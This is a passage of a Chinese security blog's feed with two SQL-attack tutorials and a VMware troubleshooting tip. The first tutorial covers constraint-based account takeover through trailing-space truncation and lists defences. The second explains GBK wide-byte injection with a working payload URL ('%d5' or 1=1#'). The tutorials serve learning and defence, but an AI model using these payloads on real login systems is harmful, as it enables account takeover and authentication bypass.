class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">过滤用户输入参数了吗？ — 完成检查</span><br><span class="line">使用单引号（’）来增加安全性了吗？ — 完成检查</span><br></pre></td></tr></table></figure></p><p>按理说应该不会出错了啊？</p><p>然而，攻击者依然能够以任意用户身份进行登录！</p><h2 id="攻击技巧"><a href="#攻击技巧" class="headerlink" title="攻击技巧"></a>攻击技巧</h2><p>在谈论这种攻击手法之前，首先我们需要了解几个关键知识点。</p><p>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;vampire     &apos;;</span><br></pre></td></tr></table></figure><p>但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</p><p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。</p><p>现在，让我们建立一个测试数据库来演示具体攻击过程。<br>(在本地自己的mysql上测试)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE DATABASE testing;</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line">mysql&gt; USE testing;</span><br><span class="line">Database changed</span><br></pre></td></tr></table></figure></p><p>接着创建一个数据表users，其包含username和password列，并且字段的最大长度限制为25个字符。然后，我将向username字段插入“vampire”，向password字段插入“my_password”。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE users (</span><br><span class="line">    -&gt;   username varchar(25),</span><br><span class="line">    -&gt;   password varchar(25)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.09 sec)</span><br><span class="line">mysql&gt; INSERT INTO users</span><br><span class="line">    -&gt; VALUES(&apos;vampire&apos;, &apos;my_password&apos;);</span><br><span class="line">Query OK, 1 row affected (0.11 sec)</span><br><span class="line">mysql&gt; SELECT * FROM users;</span><br><span class="line">+----------+-------------+</span><br><span class="line">| username | password    |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| vampire  | my_password |</span><br><span class="line">+----------+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>为了展示尾部空白字符的修剪情况，我们可以键入下列命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users</span><br><span class="line">    -&gt; WHERE username=&apos;vampire       &apos;;</span><br><span class="line">+----------+-------------+</span><br><span class="line">| username | password    |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| vampire  | my_password |</span><br><span class="line">+----------+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>现在我们假设一个存在漏洞的网站使用了前面提到的PHP代码来处理用户的注册及登录过程。为了侵入任意用户的帐户（在本例中为“vampire”），只需要使用用户名“vampire[许多空白符]1”和一个随机密码进行注册即可。对于选择的用户名，前25个字符应该只包含vampire和空白字符，这样做将有助于绕过检查特定用户名是否已存在的查询。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users</span><br><span class="line">    -&gt; WHERE username=&apos;vampire                   1&apos;;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>这里的空格符至少要十八个<br><br>需要注意的是，在执行SELECT查询语句时，SQL是不会将字符串缩短为25个字符的。因此，这里将使用完整的字符串进行搜索，所以不会找到匹配的结果。接下来，当执行INSERT查询语句时，它只会插入前25个字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;   INSERT INTO users(username, password)</span><br><span class="line">    -&gt; VALUES (&apos;vampire                   1&apos;, &apos;random_pass&apos;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.05 sec)</span><br><span class="line">mysql&gt; SELECT * FROM users</span><br><span class="line">    -&gt; WHERE username=&apos;vampire&apos;;</span><br><span class="line">+---------------------------+-------------+</span><br><span class="line">| username                  | password    |</span><br><span class="line">+---------------------------+-------------+</span><br><span class="line">| vampire                   | my_password |</span><br><span class="line">| vampire                   | random_pass |</span><br><span class="line">+---------------------------+-------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>很好，现在我们检索“vampire”的，将返回两个独立用户。注意，第二个用户名实际上是“vampire”加上尾部的18个空格。现在，如果使用用户名“vampire”和密码“random_pass”登录的话，则所有搜索该用户名的SELECT查询都将返回第一个数据记录，也就是原始的数据记录。这样的话，攻击者就能够以原始用户身份登录。这个攻击已经在MySQL和SQLite上成功通过测试。我相信在其他情况下依旧适用。</p><h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><p>毫无疑问，在进行软件开发时，需要对此类安全漏洞引起注意。我们可采取以下几项措施进行防御：</p><p>将要求或者预期具有唯一性的那些列加上UNIQUE约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。</p><p>最好使用’id’作为数据库表的主键。并且数据应该通过程序中的id进行跟踪</p><p>为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;基于约束的SQL攻击&quot;&gt;&lt;a href=&quot;#基于约束的SQL攻击&quot; class=&quot;headerlink&quot; title=&quot;基于约束的SQL攻击&quot;&gt;&lt;/a&gt;基于约束的SQL攻击&lt;/h1&gt;&lt;p&gt;转载自:&lt;a href=&quot;http://www.freebuf.com/ar
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sql宽字节注入原理</title>
    <link href="http://yoursite.com/2018/07/06/sqlkuanzijie/"/>
    <id>http://yoursite.com/2018/07/06/sqlkuanzijie/</id>
    <published>2018-07-06T05:24:35.601Z</published>
    <updated>2018-07-06T10:43:25.315Z</updated>
    
    <content type="html"><![CDATA[<h3 id="sql宽字节注入原理"><a href="#sql宽字节注入原理" class="headerlink" title="sql宽字节注入原理"></a>sql宽字节注入原理</h3><p>在magic_quotes_gpc=On的情况下，提交的参数中如果带有单引号’，就会被自动转义\’，使很多注入攻击无效.<br><a id="more"></a><br>GBK 一个汉字用两个字节表示<br><br>ASCII编码 占用一个字节<br><br>PHP中编码为GBK，函数执行添加的是ASCII编码，MYSQL默认字符集是GBK等宽字节字符集.</p><p>GBK双字节编码：一个汉字用两个字节表示，首字节对应0×81-0xFE，尾字节对应0×40-0xFE（除0×7F），刚好涵盖了转义符号\对应的编码0×5C。</p><p>0xD50×5C 对应了汉字“诚”，URL编码用百分号加字符的16进制编码表示字符，于是 %d5%5c 经URL解码后为“诚”。</p><h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><p>访问 <a href="http://www.2cto.com" target="_blank" rel="noopener">http://www.2cto.com</a> /test.php?username=test%d5′%20or%201=1%23&amp;pwd=test</p><p>经过浏览器编码，username参数值为(单引号的编码0×27)</p><p>username=test%d5%27%20or%201=1%23</p><p>经过php的url解码</p><p>username=test 0xd5 0×27 0×20 or 0×20 1=1 0×23 (为了便于阅读，在字符串与16进制编码之间加了空格)</p><p>经过PHP的GPC自动转义变成(单引号0×27被转义成\’对应的编码0×5c0×27)：</p><p>username=test 0xd5 0×5c 0×27 0×20 or 0×20 1=1 0×23</p><p>因为在数据库初始化连接的时候SET NAMES ‘gbk’，0xd50×5c解码后为诚，0×27解码为’，0×20为空格，0×23为mysql的注释符#</p><p>上面的SQL语句最终为： SELECT * FROM user WHERE username=’test诚’ or 1=1#’ and password=’test’;</p><p>注释符#后面的字符串已经无效，等价于</p><p>SELECT * FROM user WHERE username=’test诚’ or 1=1;</p><p>条件变成永真，成功注入。</p><h3 id="sql宽字节注入方法"><a href="#sql宽字节注入方法" class="headerlink" title="sql宽字节注入方法"></a>sql宽字节注入方法</h3><p>输入%df和函数执行添加的%5C，被合并成%df%5C。由于GBK是两字节，这个%df%5C被MYSQL识别为GBK。导致本应的%df\变成%df%5C。%df%5C在GBK编码中没有对应，所以被当成无效字符。</p><p>　　%DF’ ：会被PHP当中的addslashes函数转义为“%DF\’” ，“\”既URL里的“%5C”，那么也就是说，“%DF’”会被转成“%DF%5C%27”倘若网站的字符集是GBK，MYSQL使用的编码也是GBK的话，就会认为“%DF%5C%27”是一个宽字符。也就是“縗’”</p><p><a href="https://www.2cto.com/article/201209/153283.html" target="_blank" rel="noopener">sql宽字节原理</a></p><p><a href="https://www.cnblogs.com/xishaonian/p/6063961.html" target="_blank" rel="noopener">sql宽字节注入具体解释</a></p><p><a href="http://www.cnblogs.com/lcamry/articles/5625276.html" target="_blank" rel="noopener">sql宽字节注入详解</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;sql宽字节注入原理&quot;&gt;&lt;a href=&quot;#sql宽字节注入原理&quot; class=&quot;headerlink&quot; title=&quot;sql宽字节注入原理&quot;&gt;&lt;/a&gt;sql宽字节注入原理&lt;/h3&gt;&lt;p&gt;在magic_quotes_gpc=On的情况下，提交的参数中如果带有单引号’，就会被自动转义\’，使很多注入攻击无效.&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>VM一直多次黑屏问题</title>
    <link href="http://yoursite.com/2018/07/06/vmheipeing/"/>
    <id>http://yoursite.com/2018/07/06/vmheipeing/</id>
    <published>2018-07-06T05:24:35.601Z</published>
    <updated>2018-07-06T10:43:43.572Z</updated>
    
    <content type="html"><![CDATA[<h4 id="vm黑屏解决方案"><a href="#vm黑屏解决方案" class="headerlink" title="vm黑屏解决方案"></a>vm黑屏解决方案</h4><p>本人是游戏本，打开vmware经常报错套接次数问题，重启服务后以后还是会出现问题<br>后来百度一下找到解决方案<br><br><a id="more"></a><br><a href="https://jingyan.baidu.com/article/84b4f565bd1da060f6da3235.html?qq-pf-to=pcqq.group" target="_blank" rel="noopener">黑屏解决方案网址</a><br><br><br>简单来说以管理员身份运行cmd，输入如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh winsock reset</span><br></pre></td></tr></table></figure></p><p>重新启动计算机即可解决</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;vm黑屏解决方案&quot;&gt;&lt;a href=&quot;#vm黑屏解决方案&quot; class=&quot;headerlink&quot; title=&quot;vm黑屏解决方案&quot;&gt;&lt;/a&gt;vm黑屏解决方案&lt;/h4&gt;&lt;p&gt;本人是游戏本，打开vmware经常报错套接次数问题，重启服务后以后还是会出现问题&lt;br&gt;后来百度一下找到解决方案&lt;br&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
